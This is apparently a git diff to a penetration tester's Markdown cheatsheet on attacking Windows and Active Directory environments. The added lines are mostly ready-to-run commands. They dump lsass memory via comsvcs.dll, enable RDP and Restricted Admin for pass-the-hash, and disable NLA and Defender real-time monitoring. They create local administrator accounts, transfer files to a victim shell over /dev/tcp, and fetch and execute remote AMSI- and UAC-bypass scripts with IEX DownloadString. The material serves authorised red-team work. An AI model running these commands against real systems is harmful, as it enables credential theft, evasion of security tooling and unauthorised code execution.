@@ -194,9 +194,11 @@ PS > Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
 
 ```
 # Sender:
+root@kali:$ tar -zcvf folder.tar.gz folder
 root@kali:$ nc -w3 -lvnp 1234 < file.txt
 # Recipient:
-www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > /tmp/.file'
+www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > .folder.tar.gz'
+www-data@victim:$ tar -zxvf .folder.tar.gz
 
 # Recipient:
 root@kali:$ nc -w3 -lvnp 1234 > file.txt
@@ -521,6 +523,58 @@ root@kali:$ samrdump.py 127.0.0.1
 
 
 
+### RDP
+
+* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+
+
+#### Enable RDP
+
+Enable RDP from meterpreter:
+
+```
+meterpreter > run getgui -e
+```
+
+Enable RDP from PowerShell:
+
+```
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+```
+
+
+#### Restricted Admin
+
+* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
+* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
+* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
+* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
+
+RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.
+
+Enable Restricted Admin mode:
+
+```
+PS > Get-ChildItem -Recurse HKLM:\System\CurrentControlSet\Control\Lsa
+PS > Get-Item HKLM:\System\CurrentControlSet\Control\Lsa
+PS > New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
+PS > Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin"
+```
+
+
+#### NLA
+
+Disable NLA:
+
+```
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
+```
+
+
+
 ### Tricks
 
 List all domain users:
@@ -548,20 +602,27 @@ PS > Get-ADPrincipalGroupMembership snovvcrash | select Name
 Create new domain user:
 
 ```
-PS > net user snovvcrash qwe321456 /ADD /DOMAIN
+PS > net user snovvcrash Passw0rd! /ADD /DOMAIN
 Or
-PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
+PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Enabled $true
+```
+
+Create new local user and add him to local admins:
+
+```
+PS > net user testuser Passw0rd! /add
+PS > net localgroup administrators testuser /add
 ```
 
 List deleted AD objects (AD recycle bin):
+
+* [activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
+* [blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
 
 ```
 PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
 PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * |ft
 ```
-
-* [activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
-* [blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
 
 
 #### Misc
@@ -611,7 +672,15 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 
 ### lsass.exe
 
-* [www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
+
+#### comsvcs.dll
+
+* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)
+
+```
+PS C:\Windows\System32 > Get-Process lsass
+PS C:\Windows\System32 > .\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 940 C:\temp\lsass.dmp full
+```
 
 
 #### ProcDump
@@ -765,6 +834,9 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 
 ## AMSI Bypass
 
+* [github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+* [www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+
 
 
 ### Evil-WinRM + IEX
@@ -773,6 +845,17 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 *Evil-WinRM* PS > menu
 *Evil-WinRM* PS > Bypass-4MSI
 *Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
+```
+
+
+
+### Memory Patching
+
+* [0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
+
+```
+PS > IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/snovvcrash/5c9ee38bb9a8802a674ec3d3d33b4717/raw/5c77510505f505db8ac1453c60ee6fc34a8e6d59/Bypass-AMSI.ps1')
+PS > Bypass-AMSI
 ```
 
 
@@ -835,6 +918,11 @@ PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ### cmstp.exe
 
 * [0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
+
+```
+PS > IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/snovvcrash/362be57caaa167e7f5667156ac80f445/raw/1990959bc80b56179863aede06695bc499249744/Bypass-UAC.ps1')
+PS > Bypass-UAC
+```
 
 
 
@@ -957,6 +1045,12 @@ PS > Invoke-Expression $dec
 
 
 #### Windows Defender
+
+Disable from command line (must be elevated):
+
+```
+PS > Set-MpPreference -DisableRealTimeMonitoring $true
+```
 
 Add path to exclusions (must be elevated):
 
@@ -1972,8 +2066,11 @@ PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Inte
 
 #### SDDL
 
-1. [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
-2. [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
+* [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
+* [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
+* [0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html](https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html)
+* [security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/](https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/)
+
 
 
 
@@ -2267,7 +2364,7 @@ Responder:
 
 ```
 $ git clone https://github.com/lgandx/Responder
-$ sudo ./Responder.py -I eth0 -vwrf
+$ sudo ./Responder.py -I eth0 -wfrdv
 ```
 
 Inveigh:
@@ -2354,18 +2451,19 @@ root@kali:$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n
 
 Remote Management Interfaces:
 
-* 22 -- SSH
-* 80 -- HTTP
-* 443 -- SSL/TLS
-* 3389 -- RDP
-* 2222 -- SSH?
-* 5985 -- WinRM (HTTP)
-* 5986 -- WinRM (HTTPS)
+| Port |      Service       |
+|------|--------------------|
+|   22 | SSH                |
+| 3389 | RDP                |
+| 2222 | SSH?               |
+| 5900 | VNC                |
+| 5985 | WinRM              |
+| 5986 | WinRM over SSL/TLS |
 
 Nmap:
 
 ```
-root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,80,443,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
+root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
 root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
 ```
 
@@ -2902,6 +3000,7 @@ PS > .\SharpHound.exe -c SessionLoop
 Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
 
 ```
+# http://localhost:7474/browser/
 MATCH (u1:User)
 WITH COUNT(u1) AS totalUsers
 MATCH (c:Computer)-[r:HasSession]->(u2:User)
@@ -3032,6 +3131,8 @@ $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("h
 
 
 ### Unsorted
+
+* [https://www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/)
 
 ```
 root@kali:$ kerbrute userenum -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
@@ -3184,6 +3285,18 @@ GitHub:
 $ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
 $ nikto -h http://127.0.0.1 -Cgidirs all
 ```
+
+
+
+
+
+# Mindmaps
+
+* [Pentesting AD](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
+* [Pentesting Exchange](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
+* [Abusing ACEs](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/ACEs_xmind.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
+* [Pentesting Wi-Fi](https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png) · [koutto/pi-pwnbox-rogueap](https://github.com/koutto/pi-pwnbox-rogueap)
+* [Pentesting Web Applications](https://raw.githubusercontent.com/snovvcrash/cheatsheets/master/images/Web-Application-Pentest-Checklist.jpg) · [Chintan Gurjar](https://medium.com/@chintanfrogygurjar/professional-web-application-pentest-checklist-10ae5b2edbdd)
 
 
 
@@ -3598,7 +3711,9 @@ Mix settings list (both for hardware install and virtualization):
 				$ passwd root
 				* Re-login as root
 			CASE (non-root):
-				$ sudo useradd -u 1337 snovvcrash
+				$ sudo useradd -m -s /bin/bash -u 1337 snovvcrash
+				$ passwd snovvcrash
+				$ usermod -aG sudo snovvcrash
 				* Re-login as snovvcrash
 		}
 	* Disable kali user [VM]
